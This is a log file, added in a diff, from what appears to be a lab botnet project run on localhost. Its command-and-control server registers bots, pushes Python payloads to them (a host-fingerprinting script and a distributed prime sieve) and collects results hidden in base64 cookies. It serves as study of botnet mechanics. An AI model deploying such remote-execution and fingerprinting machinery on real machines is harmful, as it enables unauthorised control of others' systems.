+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: UMVU9VX4;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:20:45 2016
+INFO:root:Bot: 53L3F0GE;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:20:48 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /53L3F0GE HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Command is: $UP$UMVU9VX4:53L3F0GE$/home/shawn/actualbotnet/botnetproject/SievePayload.py
+INFO:root:Before split $UP$UMVU9VX4:53L3F0GE$/home/shawn/actualbotnet/botnetproject/SievePayload.py
+INFO:root:Split command: UP
+DEBUG:root:Adding payload: 4T53BWZ9
+INFO:root:Bot: UMVU9VX4;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:20:45 2016
+INFO:root:Bot: 53L3F0GE;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:20:48 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /UMVU9VX4 HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Checking if is target
+DEBUG:root:Checking payload: 4T53BWZ9
+DEBUG:root:Targets: 2
+DEBUG:root:Is in 4T53BWZ9
+DEBUG:root:Payload selected: 4T53BWZ9
+DEBUG:root:tempcommand = ['UMVU9VX4', '53L3F0GE']
+DEBUG:root:botindex1 0
+DEBUG:root:Sending Response: 1.1 200 OK
+Date: Fri, 09 Dec 2016 18:21:11
+Server: Apache
+Content-Length: 1436
+Connection: close
+Content-Type:text/html
+1422;4T53BWZ9;#Sieve payload, XYZ12
+
+import math
+
+
+
+global DistSieveTarget
+
+global n
+
+global tlow
+
+global thigh
+
+global math
+
+
+
+def DistSieveTarget((n, tlow, thigh), B=None):
+
+    #sieve for use in threads of DistributedSieve
+
+    #n == number to sieve
+
+    #B == list of primes used to sieve
+
+    #A == partition we want to sieve
+
+    #tindex = first number A represents
+
+    print tlow, thigh
+
+    list1 = [True for _ in xrange(0, n+1)]#list of all numbers to sieve
+
+
+
+    list2 = [True for _ in xrange(0, thigh-tlow+1)]#list of numbers in this partition
+
+
+
+    outerlimit = math.sqrt(n)
+
+    i = 2
+
+    
+
+    while i <= outerlimit:
+
+        if list1[i]:
+
+            p = i ** 2
+
+            while p <= n:
+
+                list1[p] = False
+
+                p += i
+
+                
+
+            q = i ** 2
+
+            while q <= thigh:
+
+                if q < tlow:
+
+                    q += i
+
+                    continue
+
+                try:
+
+                    list2[q-tlow] = False
+
+                except:
+
+                    print tlow, thigh
+
+                    print q-tlow
+
+                    print list2
+
+                    print thigh-tlow+1
+
+                    raise IndexError
+
+                q += i
+
+        i += 1
+
+
+
+    C = [val+tlow for val, j in enumerate(list2) if j]
+
+
+
+    return C
+
+
+
+
+
+def execute():
+
+    return DistSieveTarget((n, tlow, thigh))
+
+
+
+n = 101
+
+tlow = 2
+
+thigh = 101
+
+tlow = 0
+thigh = 49
+
+INFO:root:Bot: UMVU9VX4;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:20:45 2016
+INFO:root:Bot: 53L3F0GE;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:20:48 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /UMVU9VX4/r/ HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Cookie: _res=KGxwMQpJMAphSTEKYUkyCmFJMwphSTUKYUk3CmFJMTEKYUkxMwphSTE3CmFJMTkKYUkyMwphSTI5CmFJMzEKYUkzNwphSTQxCmFJNDMKYUk0NwphLg== _src=4T53BWZ9 
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: UMVU9VX4;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:20:45 2016
+INFO:root:Bot: 53L3F0GE;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:20:48 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /53L3F0GE HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Checking if is target
+DEBUG:root:Checking payload: 4T53BWZ9
+DEBUG:root:Targets: 2
+DEBUG:root:Is in 4T53BWZ9
+DEBUG:root:Payload selected: 4T53BWZ9
+DEBUG:root:tempcommand = ['UMVU9VX4', '53L3F0GE']
+DEBUG:root:botindex1 50
+DEBUG:root:Sending Response: 1.1 200 OK
+Date: Fri, 09 Dec 2016 18:21:13
+Server: Apache
+Content-Length: 1437
+Connection: close
+Content-Type:text/html
+1423;4T53BWZ9;#Sieve payload, XYZ12
+
+import math
+
+
+
+global DistSieveTarget
+
+global n
+
+global tlow
+
+global thigh
+
+global math
+
+
+
+def DistSieveTarget((n, tlow, thigh), B=None):
+
+    #sieve for use in threads of DistributedSieve
+
+    #n == number to sieve
+
+    #B == list of primes used to sieve
+
+    #A == partition we want to sieve
+
+    #tindex = first number A represents
+
+    print tlow, thigh
+
+    list1 = [True for _ in xrange(0, n+1)]#list of all numbers to sieve
+
+
+
+    list2 = [True for _ in xrange(0, thigh-tlow+1)]#list of numbers in this partition
+
+
+
+    outerlimit = math.sqrt(n)
+
+    i = 2
+
+    
+
+    while i <= outerlimit:
+
+        if list1[i]:
+
+            p = i ** 2
+
+            while p <= n:
+
+                list1[p] = False
+
+                p += i
+
+                
+
+            q = i ** 2
+
+            while q <= thigh:
+
+                if q < tlow:
+
+                    q += i
+
+                    continue
+
+                try:
+
+                    list2[q-tlow] = False
+
+                except:
+
+                    print tlow, thigh
+
+                    print q-tlow
+
+                    print list2
+
+                    print thigh-tlow+1
+
+                    raise IndexError
+
+                q += i
+
+        i += 1
+
+
+
+    C = [val+tlow for val, j in enumerate(list2) if j]
+
+
+
+    return C
+
+
+
+
+
+def execute():
+
+    return DistSieveTarget((n, tlow, thigh))
+
+
+
+n = 101
+
+tlow = 2
+
+thigh = 101
+
+tlow = 50
+thigh = 99
+
+INFO:root:Bot: UMVU9VX4;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:20:45 2016
+INFO:root:Bot: 53L3F0GE;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:20:48 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /53L3F0GE/r/ HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Cookie: _res=KGxwMQpJNTMKYUk1OQphSTYxCmFJNjcKYUk3MQphSTczCmFJNzkKYUk4MwphSTg5CmFJOTcKYS4= _src=4T53BWZ9 
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Writing to file
+DEBUG:root:Unexpected Error: expected a string or other character buffer object
+INFO:root:Bot: UMVU9VX4;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:20:45 2016
+INFO:root:Bot: 53L3F0GE;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:20:48 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /UMVU9VX4 HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Checking if is target
+DEBUG:root:Checking payload: 4T53BWZ9
+DEBUG:root:Targets: 2
+INFO:root:Bot: UMVU9VX4;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:20:45 2016
+INFO:root:Bot: 53L3F0GE;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:20:48 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /53L3F0GE HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Checking if is target
+DEBUG:root:Checking payload: 4T53BWZ9
+DEBUG:root:Targets: 2
+INFO:root:Bot: UMVU9VX4;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:20:45 2016
+INFO:root:Bot: 53L3F0GE;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:20:48 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /UMVU9VX4 HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Checking if is target
+DEBUG:root:Checking payload: 4T53BWZ9
+DEBUG:root:Targets: 2
+INFO:root:Bot: UMVU9VX4;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:20:45 2016
+INFO:root:Bot: 53L3F0GE;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:20:48 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /53L3F0GE HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Checking if is target
+DEBUG:root:Checking payload: 4T53BWZ9
+DEBUG:root:Targets: 2
+INFO:root:Bot: UMVU9VX4;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:20:45 2016
+INFO:root:Bot: 53L3F0GE;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:20:48 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /UMVU9VX4 HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Checking if is target
+DEBUG:root:Checking payload: 4T53BWZ9
+DEBUG:root:Targets: 2
+INFO:root:Bot: UMVU9VX4;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:20:45 2016
+INFO:root:Bot: 53L3F0GE;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:20:48 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /53L3F0GE HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Checking if is target
+DEBUG:root:Checking payload: 4T53BWZ9
+DEBUG:root:Targets: 2
+INFO:root:Bot: UMVU9VX4;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:20:45 2016
+INFO:root:Bot: 53L3F0GE;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:20:48 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /UMVU9VX4 HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Checking if is target
+DEBUG:root:Checking payload: 4T53BWZ9
+DEBUG:root:Targets: 2
+INFO:root:Bot: UMVU9VX4;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:20:45 2016
+INFO:root:Bot: 53L3F0GE;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:20:48 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /53L3F0GE HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Checking if is target
+DEBUG:root:Checking payload: 4T53BWZ9
+DEBUG:root:Targets: 2
+INFO:root:Starting main.
+DEBUG:root:Before Server Process
+INFO:root:Started server process
+INFO:root:Connecting to GUI 
+INFO:root:Connected to GUI 
+INFO:root:Command is: $GS$
+INFO:root:Before split $GS$
+INFO:root:Split command: GS
+INFO:root:Returning list of bots.
+INFO:root:Sending 
+
+DEBUG:root:In Server process
+INFO:root:Listening on port: 80
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET / HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Creating new bot
+DEBUG:root:Sending: 1.1 200 OK
+Date: Fri, 09 Dec 2016 18:23:15
+Server: Apache
+Content-Length: 412
+Connection: close
+Content-Type:text/html
+YOEWDRPV;388;getInfo.py;import os
+import platform
+import cPickle
+import urllib2
+import time
+
+def execute():
+    fqn = os.uname()[1]
+    machine = platform.machine()
+    OS = os.name + " " + platform.system() + " " + platform.release()
+    try:
+        ip = urllib2.urlopen('http://ip.42.pl/raw').read()
+    except:
+        ip = ''
+    t = time.strftime('%c')
+    info = [fqn, OS, machine, ip, t]
+    return info
+
+INFO:root:Bot: YOEWDRPV;;;;;;0;
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /YOEWDRPV/r/ HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Cookie: _res=KGxwMQpTJ3VidW50dS1jdGYnCnAyCmFTJ3Bvc2l4IExpbnV4IDQuNC4wLTUxLWdlbmVyaWMnCnAzCmFTJ3g4Nl82NCcKcDQKYVMnJwphUydGcmkgRGVjICA5IDE4OjIzOjE1IDIwMTYnCnA1CmEu _src=getInfo.py 
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: YOEWDRPV;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:23:15 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET / HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Creating new bot
+DEBUG:root:Sending: 1.1 200 OK
+Date: Fri, 09 Dec 2016 18:23:17
+Server: Apache
+Content-Length: 412
+Connection: close
+Content-Type:text/html
+HFQMLMZ8;388;getInfo.py;import os
+import platform
+import cPickle
+import urllib2
+import time
+
+def execute():
+    fqn = os.uname()[1]
+    machine = platform.machine()
+    OS = os.name + " " + platform.system() + " " + platform.release()
+    try:
+        ip = urllib2.urlopen('http://ip.42.pl/raw').read()
+    except:
+        ip = ''
+    t = time.strftime('%c')
+    info = [fqn, OS, machine, ip, t]
+    return info
+
+INFO:root:Bot: YOEWDRPV;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:23:15 2016
+INFO:root:Bot: HFQMLMZ8;;;;;;0;
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /HFQMLMZ8/r/ HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Cookie: _res=KGxwMQpTJ3VidW50dS1jdGYnCnAyCmFTJ3Bvc2l4IExpbnV4IDQuNC4wLTUxLWdlbmVyaWMnCnAzCmFTJ3g4Nl82NCcKcDQKYVMnJwphUydGcmkgRGVjICA5IDE4OjIzOjE3IDIwMTYnCnA1CmEu _src=getInfo.py 
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: YOEWDRPV;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:23:15 2016
+INFO:root:Bot: HFQMLMZ8;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:23:17 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /YOEWDRPV HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: YOEWDRPV;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:23:15 2016
+INFO:root:Bot: HFQMLMZ8;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:23:17 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /HFQMLMZ8 HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Command is: $GS$
+INFO:root:Before split $GS$
+INFO:root:Split command: GS
+INFO:root:Returning list of bots.
+INFO:root:Sending YOEWDRPV  posix Linux 4.4.0-51-generic x86_64:HFQMLMZ8  posix Linux 4.4.0-51-generic x86_64:
+
+INFO:root:Command is: $GS$
+INFO:root:Before split $GS$
+INFO:root:Split command: GS
+INFO:root:Returning list of bots.
+INFO:root:Sending YOEWDRPV  posix Linux 4.4.0-51-generic x86_64:HFQMLMZ8  posix Linux 4.4.0-51-generic x86_64:
+
+INFO:root:Command is: $GS$
+INFO:root:Before split $GS$
+INFO:root:Split command: GS
+INFO:root:Returning list of bots.
+INFO:root:Sending YOEWDRPV  posix Linux 4.4.0-51-generic x86_64:HFQMLMZ8  posix Linux 4.4.0-51-generic x86_64:
+
+INFO:root:Bot: YOEWDRPV;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:23:15 2016
+INFO:root:Bot: HFQMLMZ8;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:23:17 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /YOEWDRPV HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: YOEWDRPV;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:23:15 2016
+INFO:root:Bot: HFQMLMZ8;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:23:17 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /HFQMLMZ8 HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: YOEWDRPV;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:23:15 2016
+INFO:root:Bot: HFQMLMZ8;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:23:17 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /YOEWDRPV HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: YOEWDRPV;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:23:15 2016
+INFO:root:Bot: HFQMLMZ8;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:23:17 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /HFQMLMZ8 HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Command is: $UP$YOEWDRPV:HFQMLMZ8$/home/shawn/actualbotnet/botnetproject/SievePayload.py
+INFO:root:Before split $UP$YOEWDRPV:HFQMLMZ8$/home/shawn/actualbotnet/botnetproject/SievePayload.py
+INFO:root:Split command: UP
+DEBUG:root:Adding payload: K5LNDZUX
+INFO:root:Bot: YOEWDRPV;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:23:15 2016
+INFO:root:Bot: HFQMLMZ8;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:23:17 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /YOEWDRPV HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Checking if is target
+DEBUG:root:Checking payload: K5LNDZUX
+DEBUG:root:Targets: 2
+DEBUG:root:Is in K5LNDZUX
+DEBUG:root:Payload selected: K5LNDZUX
+DEBUG:root:tempcommand = ['YOEWDRPV', 'HFQMLMZ8']
+DEBUG:root:botindex1 0
+DEBUG:root:Sending Response: 1.1 200 OK
+Date: Fri, 09 Dec 2016 18:23:50
+Server: Apache
+Content-Length: 1436
+Connection: close
+Content-Type:text/html
+1422;K5LNDZUX;#Sieve payload, XYZ12
+
+import math
+
+
+
+global DistSieveTarget
+
+global n
+
+global tlow
+
+global thigh
+
+global math
+
+
+
+def DistSieveTarget((n, tlow, thigh), B=None):
+
+    #sieve for use in threads of DistributedSieve
+
+    #n == number to sieve
+
+    #B == list of primes used to sieve
+
+    #A == partition we want to sieve
+
+    #tindex = first number A represents
+
+    print tlow, thigh
+
+    list1 = [True for _ in xrange(0, n+1)]#list of all numbers to sieve
+
+
+
+    list2 = [True for _ in xrange(0, thigh-tlow+1)]#list of numbers in this partition
+
+
+
+    outerlimit = math.sqrt(n)
+
+    i = 2
+
+    
+
+    while i <= outerlimit:
+
+        if list1[i]:
+
+            p = i ** 2
+
+            while p <= n:
+
+                list1[p] = False
+
+                p += i
+
+                
+
+            q = i ** 2
+
+            while q <= thigh:
+
+                if q < tlow:
+
+                    q += i
+
+                    continue
+
+                try:
+
+                    list2[q-tlow] = False
+
+                except:
+
+                    print tlow, thigh
+
+                    print q-tlow
+
+                    print list2
+
+                    print thigh-tlow+1
+
+                    raise IndexError
+
+                q += i
+
+        i += 1
+
+
+
+    C = [val+tlow for val, j in enumerate(list2) if j]
+
+
+
+    return C
+
+
+
+
+
+def execute():
+
+    return DistSieveTarget((n, tlow, thigh))
+
+
+
+n = 101
+
+tlow = 2
+
+thigh = 101
+
+tlow = 0
+thigh = 49
+
+INFO:root:Bot: YOEWDRPV;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:23:15 2016
+INFO:root:Bot: HFQMLMZ8;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:23:17 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /YOEWDRPV/r/ HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Cookie: _res=KGxwMQpJMAphSTEKYUkyCmFJMwphSTUKYUk3CmFJMTEKYUkxMwphSTE3CmFJMTkKYUkyMwphSTI5CmFJMzEKYUkzNwphSTQxCmFJNDMKYUk0NwphLg== _src=K5LNDZUX 
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: YOEWDRPV;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:23:15 2016
+INFO:root:Bot: HFQMLMZ8;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:23:17 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /HFQMLMZ8 HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Checking if is target
+DEBUG:root:Checking payload: K5LNDZUX
+DEBUG:root:Targets: 2
+DEBUG:root:Is in K5LNDZUX
+DEBUG:root:Payload selected: K5LNDZUX
+DEBUG:root:tempcommand = ['YOEWDRPV', 'HFQMLMZ8']
+DEBUG:root:botindex1 50
+DEBUG:root:Sending Response: 1.1 200 OK
+Date: Fri, 09 Dec 2016 18:23:52
+Server: Apache
+Content-Length: 1437
+Connection: close
+Content-Type:text/html
+1423;K5LNDZUX;#Sieve payload, XYZ12
+
+import math
+
+
+
+global DistSieveTarget
+
+global n
+
+global tlow
+
+global thigh
+
+global math
+
+
+
+def DistSieveTarget((n, tlow, thigh), B=None):
+
+    #sieve for use in threads of DistributedSieve
+
+    #n == number to sieve
+
+    #B == list of primes used to sieve
+
+    #A == partition we want to sieve
+
+    #tindex = first number A represents
+
+    print tlow, thigh
+
+    list1 = [True for _ in xrange(0, n+1)]#list of all numbers to sieve
+
+
+
+    list2 = [True for _ in xrange(0, thigh-tlow+1)]#list of numbers in this partition
+
+
+
+    outerlimit = math.sqrt(n)
+
+    i = 2
+
+    
+
+    while i <= outerlimit:
+
+        if list1[i]:
+
+            p = i ** 2
+
+            while p <= n:
+
+                list1[p] = False
+
+                p += i
+
+                
+
+            q = i ** 2
+
+            while q <= thigh:
+
+                if q < tlow:
+
+                    q += i
+
+                    continue
+
+                try:
+
+                    list2[q-tlow] = False
+
+                except:
+
+                    print tlow, thigh
+
+                    print q-tlow
+
+                    print list2
+
+                    print thigh-tlow+1
+
+                    raise IndexError
+
+                q += i
+
+        i += 1
+
+
+
+    C = [val+tlow for val, j in enumerate(list2) if j]
+
+
+
+    return C
+
+
+
+
+
+def execute():
+
+    return DistSieveTarget((n, tlow, thigh))
+
+
+
+n = 101
+
+tlow = 2
+
+thigh = 101
+
+tlow = 50
+thigh = 99
+
+INFO:root:Bot: YOEWDRPV;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:23:15 2016
+INFO:root:Bot: HFQMLMZ8;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:23:17 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /HFQMLMZ8/r/ HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Cookie: _res=KGxwMQpJNTMKYUk1OQphSTYxCmFJNjcKYUk3MQphSTczCmFJNzkKYUk4MwphSTg5CmFJOTcKYS4= _src=K5LNDZUX 
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Writing to file
+DEBUG:root:Unexpected Error: expected a string or other character buffer object
+INFO:root:Bot: YOEWDRPV;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:23:15 2016
+INFO:root:Bot: HFQMLMZ8;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:23:17 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /YOEWDRPV HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Checking if is target
+DEBUG:root:Checking payload: K5LNDZUX
+DEBUG:root:Targets: 2
+INFO:root:Bot: YOEWDRPV;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:23:15 2016
+INFO:root:Bot: HFQMLMZ8;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:23:17 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /HFQMLMZ8 HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Checking if is target
+DEBUG:root:Checking payload: K5LNDZUX
+DEBUG:root:Targets: 2
+INFO:root:Bot: YOEWDRPV;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:23:15 2016
+INFO:root:Bot: HFQMLMZ8;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:23:17 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /YOEWDRPV HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Checking if is target
+DEBUG:root:Checking payload: K5LNDZUX
+DEBUG:root:Targets: 2
+INFO:root:Bot: YOEWDRPV;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:23:15 2016
